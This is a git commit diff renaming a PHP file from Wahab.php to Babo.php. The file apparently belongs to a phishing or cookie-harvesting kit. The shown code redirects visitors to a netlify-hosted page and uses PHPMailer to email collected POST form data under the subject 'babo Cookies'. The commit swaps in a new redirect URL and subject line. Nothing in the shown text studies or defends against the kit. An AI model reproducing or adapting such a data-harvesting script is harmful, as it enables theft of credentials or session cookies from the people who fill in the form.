e6dd01bfe1ec377ac8cccd2944399f3bf0adb7e0
Uzr44911 <ahmjtalijaan@gmail.com>
2025-07-20 16:35:47 +0500

    Update and rename Wahab.php to Babo.php

--- Babo.php
+++ Babo.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://iridescent-douhua-9ec27e-here-info.netlify.app/");
+header("Location: https://stupendous-parfait-1a810d.netlify.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -43,7 +43,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'wahab Cookies';
+        $mail->Subject = 'babo Cookies';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
